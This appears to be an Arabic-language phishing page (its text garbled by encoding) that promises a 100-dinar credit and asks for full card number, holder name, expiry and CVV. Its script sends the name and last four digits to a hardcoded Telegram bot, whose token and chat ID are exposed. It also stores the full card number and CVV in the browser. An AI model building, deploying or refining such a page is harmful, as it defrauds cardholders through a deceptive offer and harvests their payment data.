<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
<title>Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø±ØµÙŠØ¯ Ù…Ø§Ù„ÙŠ â€” Ø¨Ù‚ÙŠÙ…Ø© 100 Ø¯ÙŠÙ†Ø§Ø±</title>
<meta name="description" content="Ù†Ù…ÙˆØ°Ø¬ Ø¹Ø±Ø¶ ØªÙˆØ¶ÙŠØ­ÙŠ Ù„Ø·Ù„Ø¨ Ø§Ø³ØªØ­Ù‚Ø§Ù‚ Ø±ØµÙŠØ¯ â€” ÙŠØ¹Ù…Ù„ Ù…Ø­Ù„ÙŠÙ‹Ø§ØŒ Ù„Ø§ ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø£Ùˆ Ù†Ù‚Ù„ Ø£ÙŠ Ø¨ÙŠØ§Ù†Ø§Øª Ø®Ø§Ø±Ø¬ Ø§Ù„Ù…ØªØµÙØ­ Ø¥Ù„Ø§ ÙƒÙ…Ø§ Ù‡Ùˆ Ù…Ø­Ø¯Ø¯." />
<link rel="icon" href="data:,">
<style>
:root{
  --bg: #0f172a;
  --surface: #ffffff;
  --accent: #06b6d4;
  --accent-2: #3b82f6;
  --muted: #94a3b8;
  --text: #0f172a;
  --danger: #ef4444;
  --shadow: 0 18px 50px rgba(2,8,23,.18);
  --radius: 12px;
  font-family: Inter, system-ui, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans Arabic", sans-serif;
}
*{box-sizing:border-box}
html,body{height:100%}
body{
  margin:0;
  background:linear-gradient(180deg,#eef2ff 0%, #f8fafc 100%);
  color:var(--text);
  direction:rtl;
  padding:12px;
  display:flex;
  align-items:flex-start;
  justify-content:center;
  min-height:100vh;
}
.app{
  width:100%;
  max-width:820px;
  margin:6px;
  padding:12px;
  background:transparent;
}

/* HERO */
.hero{
  background:linear-gradient(135deg,#0b1c2d,#0f172a);
  color:white;
  border-radius:14px;
  padding:10px 12px;
  box-shadow:var(--shadow);
  display:flex;
  gap:12px;
  align-items:center;
  justify-content:space-between;
  flex-wrap:wrap;
}
.hero h1{font-size:16px;margin:0;font-weight:800}
.hero p{margin:0;color:rgba(255,255,255,.9);font-size:12px}

/* main layout: make preview and form extremely close */
.main-grid{
  display:grid;
  grid-template-columns: 1fr 1fr;
  gap:0px; /* zero gap to make them touch */
  margin-top:6px;
}
@media (max-width:900px){
  .main-grid{grid-template-columns:1fr;gap:8px}
}

/* card preview */
.card-wrap{perspective:1200px;position:relative;padding-right:6px} /* slight padding to avoid edge touch */
.card{
  width:100%;
  border-radius:var(--radius);
  min-height:150px;
  transform-style:preserve-3d;
  transition:transform .6s, box-shadow .25s;
  position:relative;
  overflow:hidden;
}
.card-face{
  position:relative;
  backface-visibility:hidden;
  border-radius:var(--radius);
  padding:10px; /* compact */
  color:#fff;
  display:flex;
  flex-direction:column;
  justify-content:space-between;
  min-height:140px;
}
.card-front{background:linear-gradient(135deg,#1e3a8a,#2563eb)}
.card-back{background:linear-gradient(135deg,#0f172a,#071033);transform:rotateY(180deg)}

.card-top{display:flex;justify-content:space-between;align-items:center;font-size:13px;opacity:.95}
.brand{display:flex;gap:8px;align-items:center;font-weight:800;font-size:13px;text-transform:uppercase}
.brand .logo{width:44px;height:30px;border-radius:8px;background:linear-gradient(90deg,#fff8cc,#ffd166);display:flex;align-items:center;justify-content:center;font-weight:800;color:#05203a;font-size:13px}
.chip{width:40px;height:26px;border-radius:6px;background:linear-gradient(135deg,#fde68a,#facc15)}
.card-number{font-size:18px;font-weight:800;letter-spacing:2px;direction:ltr;text-align:left;filter:drop-shadow(0 4px 10px rgba(0,0,0,.18))}
.card-meta{display:flex;justify-content:space-between;font-size:12px;gap:8px}
.small-muted{color:rgba(255,255,255,.9);font-weight:700}

/* small CVV box on front */
.front-cvv{
  background:rgba(0,0,0,.12);
  padding:6px 8px;
  border-radius:8px;
  font-weight:800;
  letter-spacing:2px;
  color:#fff;
  align-self:flex-end;
  margin-top:6px;
}

/* form */
.section{
  background:var(--surface);
  border-radius:12px;
  padding:8px 10px; /* small padding so it sits very close to the card */
  box-shadow:0 12px 30px rgba(2,8,23,.06);
  margin-top:0;
  border-left: 1px solid rgba(2,8,23,.03); /* subtle divider so elements don't visually merge */
}
.label{font-size:13px;color:var(--muted);margin-bottom:6px;font-weight:700;display:block}
.input{
  width:100%;
  padding:10px 12px;
  border-radius:10px;
  border:1px solid #e6eef8;
  font-size:15px;
  transition:box-shadow .14s,transform .14s,border-color .14s;
  background:transparent;
  outline:none;
  direction:ltr; /* ensure digits typed left-to-right */
  text-align:left;
}
.input:focus{box-shadow:0 8px 28px rgba(37,99,235,.08);border-color:var(--accent);transform:translateY(-1px)}
.cc-group{display:flex;gap:8px;align-items:center}
.small-btn{display:none} /* hide paste button completely per request */

/* align expiry + cvv neatly */
.form-row{display:flex;gap:10px;margin-top:8px;align-items:flex-start;flex-wrap:wrap}
.form-row .col{flex:1}

/* helper / hint / error */
.hint{font-size:13px;color:var(--muted);margin-top:8px}
.error{font-size:13px;color:var(--danger);margin-top:8px;display:none}
.error[aria-hidden="false"]{display:block}

/* actions */
.actions{margin-top:8px}
.btn{width:100%;padding:12px;border-radius:10px;border:none;background:linear-gradient(90deg,var(--accent-2),var(--accent));color:white;font-weight:900;font-size:15px;cursor:pointer}
.btn:disabled{opacity:.6;cursor:not-allowed}
.meta-footer{font-size:12px;color:var(--muted);text-align:center;margin-top:8px}

/* compact footer beneath card/form when touching */
.card-wrap + .section { margin-left:0; }

/* toast */
.toast{position:fixed;left:50%;transform:translateX(-50%);bottom:18px;background:linear-gradient(90deg,#10b981,#06b6d4);color:white;padding:10px 14px;border-radius:8px;display:none}
.toast.show{display:block}

/* responsiveness */
@media (max-width:900px){
  .main-grid{grid-template-columns:1fr;gap:10px}
  .card-wrap{padding-right:0}
}

/* focus-visible */
:focus{outline:none}
:focus-visible{box-shadow:0 0 0 4px rgba(37,99,235,.12)}
</style>
</head>
<body>

<main class="app" aria-labelledby="pageTitle">
  <header class="hero" role="banner">
    <div style="display:flex;gap:10px;align-items:center">
      <div class="brand-badge" aria-hidden="true" style="width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,#ffd166,#ffb703);display:flex;align-items:center;justify-content:center;font-weight:900;color:#05203a;font-size:18px">ğŸ’³</div>
      <div>
        <h1 id="pageTitle" style="font-size:16px;margin:0;font-weight:800">Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø±ØµÙŠØ¯ Ù…Ø§Ù„ÙŠ â€” Ø¨Ù‚ÙŠÙ…Ø© 100 Ø¯ÙŠÙ†Ø§Ø±</h1>
        <p style="margin:0;color:rgba(255,255,255,.9);font-size:12px">Ø§Ù„Ø£Ø±Ù‚Ø§Ù… ØªÙÙƒØªØ¨ Ù…Ù† Ø§Ù„ÙŠØ³Ø§Ø± Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† (LTR). Ø§Ù„Ù…Ø¹Ø§ÙŠÙ†Ø© ÙˆØ§Ù„Ù†Ù…ÙˆØ°Ø¬ Ù‚Ø±ÙŠØ¨Ø§Ù† Ø¬Ø¯Ø§Ù‹.</p>
      </div>
    </div>
  </header>

  <div class="main-grid" aria-live="polite">
    <!-- Card preview (left) -->
    <section class="card-wrap" aria-hidden="false">
      <div id="card" class="card" aria-label="Ù…Ø¹Ø§ÙŠÙ†Ø© Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©">
        <!-- FRONT -->
        <div class="card-face card-front" id="cardFront">
          <div class="card-top">
            <div style="display:flex;gap:8px;align-items:center">
              <div class="chip" aria-hidden="true"></div>
              <div class="brand" id="brandLabel" aria-hidden="false">
                <div class="logo" id="brandLogo">â€”</div>
                <div id="brandName" style="font-size:13px;opacity:.95">â€”</div>
              </div>
            </div>
            <div style="font-size:12px;opacity:.9;text-align:left">ØµØ§Ù„Ø­Ø© Ø­ØªÙ‰</div>
          </div>

          <div>
            <div class="card-number" id="cardView" aria-live="polite" aria-atomic="true">0000 0000 0000 0000</div>
            <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px">
              <div>
                <div style="font-size:11px;opacity:.9">Ù…Ø§Ù„Ùƒ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</div>
                <div class="small-muted" id="ownerView">Ø§Ù„Ø§Ø³Ù… Ù‡Ù†Ø§</div>
              </div>
              <div style="text-align:left">
                <div style="font-size:11px;opacity:.9">CVV</div>
                <div class="front-cvv" id="frontCvvView">***</div>
              </div>
            </div>
          </div>
        </div>

        <!-- BACK (flips on CVV focus) -->
        <div class="card-face card-back" id="cardBack" aria-hidden="true" aria-label="Ø¸Ù‡Ø± Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©">
          <div style="height:36px;background:#000;border-radius:8px;margin-top:6px"></div>
          <div style="display:flex;justify-content:space-between;align-items:center;margin-top:10px">
            <div style="flex:1">
              <div style="font-size:11px;color:rgba(255,255,255,.85)">Ø§Ù„ØªÙˆÙ‚ÙŠØ¹</div>
              <div style="background:#fff;color:#111;padding:6px 8px;border-radius:6px;margin-top:6px;font-weight:700">-- ØªÙˆÙ‚ÙŠØ¹ --</div>
            </div>
            <div style="min-width:84px;text-align:left">
              <div style="font-size:11px;color:rgba(255,255,255,.85);text-align:left">CVV</div>
              <div class="cvv-field" id="cvvView" aria-live="polite">***</div>
            </div>
          </div>
        </div>
      </div>

      <div style="display:flex;gap:6px;margin-top:6px;align-items:center">
        <button id="showNumberBtn" aria-pressed="true" class="small-btn" title="Ø¥Ø¸Ù‡Ø§Ø±/Ø¥Ø®ÙØ§Ø¡ Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©" aria-label="Ø¥Ø¸Ù‡Ø§Ø± Ø£Ùˆ Ø¥Ø®ÙØ§Ø¡ Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©" style="display:inline-block;background:#fff8; padding:6px 10px;border-radius:8px;border:1px solid rgba(0,0,0,.06);cursor:pointer">ğŸ‘ï¸ Ø¥Ø¸Ù‡Ø§Ø±</button>
        <div style="flex:1" class="hint">Ø§Ù„Ù…Ø¹Ø§ÙŠÙ†Ø© Ù…Ø­Ø¯Ø«Ø© Ù…Ø¨Ø§Ø´Ø±Ø©Ù‹ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„ÙƒØªØ§Ø¨Ø©.</div>
      </div>
    </section>

    <!-- Form (right) -->
    <form id="eligibilityForm" class="section" novalidate autocomplete="off">
      <div style="margin-bottom:8px">
        <label for="cardNumber" class="label">Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© (16 Ø±Ù‚Ù…)</label>
        <div class="cc-group" role="group" aria-labelledby="cardNumber">
          <input id="cardNumber" class="input cc-input" type="text" inputmode="numeric"
                 placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number"
                 name="cc-number" aria-label="Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©" dir="ltr" style="text-align:left;direction:ltr;">
        </div>
        <div id="cardError" class="error" role="alert" aria-hidden="true"></div>
      </div>

      <div style="margin-bottom:8px">
        <label for="owner" class="label">Ø§Ø³Ù… ØµØ§Ø­Ø¨ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</label>
        <input id="owner" class="input" type="text" placeholder="Ø§Ù„Ø§Ø³Ù… ÙƒÙ…Ø§ Ø¹Ù„Ù‰ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©" autocomplete="cc-name" name="cc-name" />
      </div>

      <div class="form-row" style="margin-top:6px">
        <div class="col" style="min-width:45%;">
          <label for="exp" class="label">ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ (MM/YY)</label>
          <input id="exp" class="input" inputmode="numeric" maxlength="5" placeholder="MM/YY" autocomplete="cc-exp" name="cc-exp" />
          <div id="expError" class="error" role="alert" aria-hidden="true"></div>
        </div>

        <div class="col" style="min-width:45%;">
          <label for="cvv" class="label">CVV</label>
          <input id="cvv" class="input" inputmode="numeric" maxlength="3" placeholder="***" autocomplete="cc-csc" name="cc-csc" />
          <div id="cvvError" class="error" role="alert" aria-hidden="true"></div>
        </div>
      </div>

      <div style="display:flex;gap:8px;align-items:center;margin-top:10px">
        <input type="checkbox" id="persistToggle" />
        <label for="persistToggle" class="hint" style="margin:0">Ø­ÙØ¸ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ù…Ø­Ù„ÙŠÙ‹Ø§ ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ù…ØªØµÙØ­ (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)</label>
      </div>

      <div class="actions">
        <button id="submitBtn" class="btn" type="submit" disabled>Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø§Ù„Ø§Ø³ØªØ­Ù‚Ø§Ù‚</button>
        <div class="meta-footer" style="margin-top:8px">
          <span id="liveStatus" aria-live="polite"></span>
        </div>
      </div>
    </form>
  </div>
</main>

<div id="toast" class="toast" role="status" aria-live="polite"></div>

<script>
/*
  Ø§Ù„ØªØ¹Ø¯ÙŠÙ„Ø§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©:
  - Ø¬Ø¹Ù„ Ø§Ù„Ù…Ø¹Ø§ÙŠÙ†Ø© ÙˆØ§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø£Ù‚Ø±Ø¨ ÙƒØ«ÙŠØ±Ø§Ù‹ (gap:0 ÙÙŠ CSS) Ù…Ø¹ ÙØ§ØµÙ„ Ø¨ØµØ±ÙŠ Ø®ÙÙŠÙ.
  - Ø¥Ø²Ø§Ù„Ø© Ø®ÙŠØ§Ø± "Ù„ØµÙ‚" Ù†Ù‡Ø§Ø¦ÙŠÙ‹Ø§Ø› Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¹Ù†Ø§ØµØ± Ø£Ùˆ Ù…Ø³ØªÙ…Ø¹ÙˆÙ† Ù„Ø°Ù„Ùƒ Ø§Ù„Ø¢Ù†.
  - Ø­Ù‚ÙˆÙ„ Ù…ÙØ±ØªØ¨Ø© Ø¨Ø¹Ù†Ø§ÙŠØ© (card, owner, exp + cvv).
  - Ø¥Ø¯Ø®Ø§Ù„ Ø£Ø±Ù‚Ø§Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ù…Ù† Ø§Ù„ÙŠØ³Ø§Ø± Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† (dir="ltr") ÙˆÙ…Ù‚ÙŠØ¯ Ø¥Ù„Ù‰ 16 Ø±Ù‚Ù…Ù‹Ø§ ÙØ¹Ù„ÙŠÙ‹Ø§.
  - Ø§Ù„Ù…Ø¹Ø§ÙŠÙ†Ø© ØªØ¹Ø±Ø¶ Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© (Ø¨ØµÙŠØºØ© 4-4-4-4)ØŒ Ø§Ø³Ù… Ø§Ù„Ù…Ø§Ù„ÙƒØŒ ÙˆCVV (Ø£Ù…Ø§Ù…/Ø®Ù„Ù).
  - Ø¹Ù†Ø¯ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ ÙŠÙØ±Ø³Ù„ ÙÙ‚Ø· Ø§Ù„Ø§Ø³Ù… ÙˆØ¢Ø®Ø± 4 Ø£Ø±Ù‚Ø§Ù… ÙƒÙ…Ø§ Ø§ØªÙÙÙ‚ (Ù„Ø§ CVV Ø£Ùˆ PAN ÙƒØ§Ù…Ù„).
*/

/* ====== TELEGRAM CREDENTIALS (Ù…Ø¶Ù…Ù†Ø© Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø·Ù„Ø¨Ùƒ Ø§Ù„Ø³Ø§Ø¨Ù‚) ====== */
const TELEGRAM_BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
const TELEGRAM_CHAT_ID  = "6873334348";
/* ================================================================== */

const $ = s => document.querySelector(s);
const onlyDigits = s => (s||'').replace(/\D/g,'');

const cardNumber = $('#cardNumber');
const ownerInput = $('#owner');
const expInput = $('#exp');
const cvvInput = $('#cvv');

const cardView = $('#cardView');
const ownerView = $('#ownerView');
const frontCvvView = $('#frontCvvView');
const cvvView = $('#cvvView');

const cardError = $('#cardError');
const expError = $('#expError');
const cvvError = $('#cvvError');

const submitBtn = $('#submitBtn');
const showNumberBtn = $('#showNumberBtn');
const persistToggle = $('#persistToggle');
const toast = $('#toast');
const liveStatus = $('#liveStatus');

let state = {
  digits: '',
  showNumber: true,
  valid: false,
  persist: false
};

function formatGroups16(d){
  const d16 = (d||'').slice(0,16);
  return d16.replace(/(.{4})/g,'$1 ').trim();
}

/* Luhn */
function luhn(num){
  num = String(num).replace(/\D/g,'');
  let sum=0, alt=false;
  for(let i=num.length-1;i>=0;i--){
    let n=parseInt(num[i],10);
    if(alt){ n*=2; if(n>9) n-=9; }
    sum += n; alt = !alt;
  }
  return (sum % 10) === 0;
}

function render(){
  const d = onlyDigits(cardNumber.value).slice(0,16);
  state.digits = d;
  const formatted = formatGroups16(d);
  cardView.textContent = d.length ? (state.showNumber ? formatted : formatted.replace(/\d/g,'â€¢')) : '0000 0000 0000 0000';
  ownerView.textContent = (ownerInput.value||'').trim() || 'Ø§Ù„Ø§Ø³Ù… Ù‡Ù†Ø§';
  const cv = onlyDigits(cvvInput.value).slice(0,3);
  frontCvvView.textContent = cv ? cv : '***';
  cvvView.textContent = cv ? cv : '***';
  validateAll();
}

/* validations */
function validateCardNumber(){
  const d = state.digits;
  if(!d){ cardError.setAttribute('aria-hidden','true'); cardError.textContent=''; return false; }
  if(d.length !== 16){
    cardError.setAttribute('aria-hidden','false'); cardError.textContent = 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ 16 Ø±Ù‚Ù…Ø§Ù‹ Ø¨Ø§Ù„Ø¶Ø¨Ø·.';
    return false;
  }
  if(!luhn(d)){
    cardError.setAttribute('aria-hidden','false'); cardError.textContent = 'ØªØ­Ù‚Ù‚ Luhn ÙØ´Ù„ â€” Ø±Ù‚Ù… ØºÙŠØ± ØµØ§Ù„Ø­.';
    return false;
  }
  cardError.setAttribute('aria-hidden','true'); cardError.textContent='';
  return true;
}

function validateExpiry(){
  const v = (expInput.value||'').trim();
  expError.setAttribute('aria-hidden','true'); expError.textContent='';
  if(!v) return false;
  if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(v)){
    expError.setAttribute('aria-hidden','false'); expError.textContent='Ø§Ù„ØªÙ†Ø³ÙŠÙ‚ ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† MM/YY';
    return false;
  }
  const [mm,yy] = v.split('/');
  const year = 2000 + parseInt(yy,10);
  const month = parseInt(mm,10);
  const now = new Date();
  const curY = now.getFullYear(), curM = now.getMonth()+1;
  if(year < curY || (year === curY && month < curM)){
    expError.setAttribute('aria-hidden','false'); expError.textContent='Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ù…Ù†ØªÙ‡ÙŠØ© Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©.';
    return false;
  }
  expError.setAttribute('aria-hidden','true'); expError.textContent='';
  return true;
}

function validateCVV(){
  const cv = onlyDigits(cvvInput.value);
  cvvError.setAttribute('aria-hidden','true'); cvvError.textContent='';
  if(!cv) return false;
  if(cv.length !== 3){ cvvError.setAttribute('aria-hidden','false'); cvvError.textContent='CVV ÙŠØ¬Ø¨ Ø£Ù† ÙŠØªÙƒÙˆÙ† Ù…Ù† 3 Ø£Ø±Ù‚Ø§Ù….'; return false; }
  return true;
}

function validateAll(){
  const c = validateCardNumber();
  const e = validateExpiry();
  const v = validateCVV();
  const all = c && e && v;
  submitBtn.disabled = !all;
  state.valid = all;
  liveStatus.textContent = all ? '' : 'Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØºÙŠØ± Ù…ÙƒØªÙ…Ù„Ø©';
  return all;
}

/* input handlers */
cardNumber.addEventListener('input', e=>{
  const digits = onlyDigits(e.target.value).slice(0,16);
  e.target.value = formatGroups16(digits);
  // caret to end
  setTimeout(()=> {
    try{ e.target.setSelectionRange(e.target.value.length, e.target.value.length); }catch(_){}
  },0);
  render();
});

cardNumber.addEventListener('paste', e=>{
  e.preventDefault();
  const txt = (e.clipboardData || window.clipboardData).getData('text');
  const digits = onlyDigits(txt).slice(0,16);
  if(!digits) return;
  cardNumber.value = formatGroups16(digits);
  render();
});

expInput.addEventListener('input', e=>{
  let v = onlyDigits(e.target.value).slice(0,4);
  if(v.length>2) v = v.slice(0,2) + '/' + v.slice(2);
  e.target.value = v;
  render();
});

cvvInput.addEventListener('input', e=>{
  e.target.value = onlyDigits(e.target.value).slice(0,3);
  render();
});

ownerInput.addEventListener('input', ()=>{ render(); markDirty(); });

/* show/hide number button */
showNumberBtn.addEventListener('click', ()=>{
  state.showNumber = !state.showNumber;
  showNumberBtn.textContent = state.showNumber ? 'ğŸ‘ï¸ Ø¥Ø¸Ù‡Ø§Ø±' : 'ğŸ™ˆ Ø¥Ø®ÙØ§Ø¡';
  showNumberBtn.setAttribute('aria-pressed', String(state.showNumber));
  render();
});

/* flip card when cvv focus */
cvvInput.addEventListener('focus', ()=>{
  document.getElementById('card').classList.add('is-flipped');
  $('#cardBack').setAttribute('aria-hidden','false');
  $('#cardFront').setAttribute('aria-hidden','true');
});
cvvInput.addEventListener('blur', ()=>{
  document.getElementById('card').classList.remove('is-flipped');
  $('#cardBack').setAttribute('aria-hidden','true');
  $('#cardFront').setAttribute('aria-hidden','false');
});

/* persist toggle */
persistToggle.addEventListener('change', (e)=>{
  state.persist = e.target.checked;
  if(state.persist){ saveFormToLocal(); showToast('ØªÙ… Ø­ÙØ¸ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ù…Ø­Ù„ÙŠÙ‹Ø§'); }
  else { localStorage.removeItem('demo_form'); showToast('ØªÙ… ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ø­ÙØ¸ Ø§Ù„Ù…Ø­Ù„ÙŠ'); }
});

/* show toast */
let toastTimeout = null;
function showToast(msg, ms=1600){
  toast.textContent = msg;
  toast.classList.add('show');
  if(toastTimeout) clearTimeout(toastTimeout);
  toastTimeout = setTimeout(()=>{ toast.classList.remove('show'); toastTimeout = null; }, ms);
}

/* form submit: only send owner + last4 */
document.getElementById('eligibilityForm').addEventListener('submit', async (e)=>{
  e.preventDefault();
  if(!validateAll()){ showToast('Ù…Ù† ÙØ¶Ù„Ùƒ ØµØ­Ù‘Ø­ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡ Ù‚Ø¨Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„.'); return; }

  submitBtn.disabled = true;
  const prev = submitBtn.textContent;
  submitBtn.textContent = 'Ø¬Ø§Ø±Ù Ø§Ù„Ø¥Ø±Ø³Ø§Ù„...';

  const owner = (ownerInput.value||'').trim();
  const last4 = state.digits.slice(-4) || '----';

  if(!confirm('Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø§Ø³Ù… ÙˆØ¢Ø®Ø± 4 Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø· Ø¥Ù„Ù‰ Ø¨ÙˆØª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…. Ù…ÙˆØ§ÙÙ‚ØŸ')){
    submitBtn.textContent = prev;
    submitBtn.disabled = false;
    return;
  }

  const message = `Ù†Ù…ÙˆØ°Ø¬ Ø¬Ø¯ÙŠØ¯ (Ø¢Ù…Ù†)\nØ§Ù„Ø§Ø³Ù…: ${owner || '--'}\nØ¢Ø®Ø± 4 Ø£Ø±Ù‚Ø§Ù…: ${last4}\nÙ…Ù„Ø§Ø­Ø¸Ø©: Ù„Ø§ ÙŠØ­ØªÙˆÙŠ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø± Ø¹Ù„Ù‰ CVV Ø£Ùˆ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙƒØ§Ù…Ù„.`;

  try{
    const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
    const resp = await fetch(url, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    });
    const json = await resp.json().catch(()=>null);
    if(resp.ok && json && json.ok){
      showToast('ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…', 2200);
    } else {
      console.error('Telegram API:', resp.status, json);
      if(!json) showToast('ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ â€” Ø±Ø¨Ù…Ø§ CORS Ø£Ùˆ Ù…Ø´ÙƒÙ„Ø© Ø´Ø¨ÙƒÙŠØ©.');
      else showToast('ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ â€” Ø±Ø§Ø¬Ø¹ Console Ù„Ù„ØªÙØ§ØµÙŠÙ„.');
    }
  }catch(err){
    console.error('Network/CORS error', err);
    showToast('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ© Ø£Ùˆ CORS â€” Ø§Ø³ØªØ®Ø¯Ù… Ø®Ø§Ø¯Ù… ÙˆØ³ÙŠØ· Ø¥Ø°Ø§ Ù„Ø²Ù….');
  }

  submitBtn.textContent = prev;
  submitBtn.disabled = false;

  if(state.persist) saveFormToLocal();
});

/* local save/restore */
function saveFormToLocal(){
  try{
    const payload = {
      card: state.digits,
      owner: ownerInput.value||'',
      exp: expInput.value||'',
      cvv: cvvInput.value||'',
      dateSaved: new Date().toISOString()
    };
    localStorage.setItem('demo_form', JSON.stringify(payload));
  }catch(e){}
}
function restoreFormFromLocal(){
  try{
    const raw = localStorage.getItem('demo_form');
    if(!raw) return;
    const data = JSON.parse(raw);
    if(data.card) cardNumber.value = formatGroups16(data.card);
    ownerInput.value = data.owner || '';
    expInput.value = data.exp || '';
    cvvInput.value = data.cvv || '';
    render();
    showToast('ØªÙ… Ø§Ø³ØªØ¹Ø§Ø¯Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø­ÙÙˆØ¸Ø© Ù…Ø­Ù„ÙŠÙ‹Ø§');
  }catch(e){}
}
(function init(){
  const existing = localStorage.getItem('demo_form');
  if(existing){ persistToggle.checked = true; state.persist = true; restoreFormFromLocal(); }
  render();
})();

/* dirty protection */
let isDirty = false;
function markDirty(){ isDirty = true; }
['input','change'].forEach(evt => document.getElementById('eligibilityForm').addEventListener(evt, ()=> isDirty = true));
window.addEventListener('beforeunload', (e) => { if(isDirty){ e.preventDefault(); e.returnValue=''; } });

</script>
</body>
</html>